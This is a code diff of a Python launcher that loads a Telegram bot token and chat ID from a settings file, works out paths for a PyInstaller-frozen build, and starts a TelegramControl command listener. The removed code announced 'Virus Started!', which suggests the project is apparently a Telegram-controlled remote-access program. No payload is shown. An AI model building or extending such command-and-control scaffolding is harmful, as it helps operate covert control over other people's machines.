@@ -1,18 +1,26 @@
-import telebot
 import os
+import sys
 import configparser
+from Modules.telegram_control import TelegramControl
 
+# Define base path
+if getattr(sys, 'frozen', False):
+    base_path = sys._MEIPASS
+else:
+    base_path = os.path.dirname(os.path.abspath(__file__))
+
+config_path = os.path.join(base_path, "Data", "settings.ini")
+messages_path = os.path.join(base_path, "Data", "messages.json")
+
+# Load settings
 config = configparser.ConfigParser()
-config.read(os.path.join("Data", 'settings.ini'))
+config.read(config_path)
 
-bot = telebot.TeleBot(config["Telegram"]["bot_token"])
+bot_token = config["Telegram"]["bot_token"]
+chat_id = config["Telegram"]["chat_id"]
 
-bot.send_message(config["Telegram"]["chat_id"], "Virus Started!")
+# Initialize Telegram control
+telegram = TelegramControl(bot_token, chat_id, messages_path)
 
-@bot.message_handler(commands=['stop'])
-def stop(message):
-    bot.reply_to(message, "Stopping bot")
-    bot.stop_polling()
-
-
-bot.polling()
+# Start listening for commands
+telegram.start_listening()
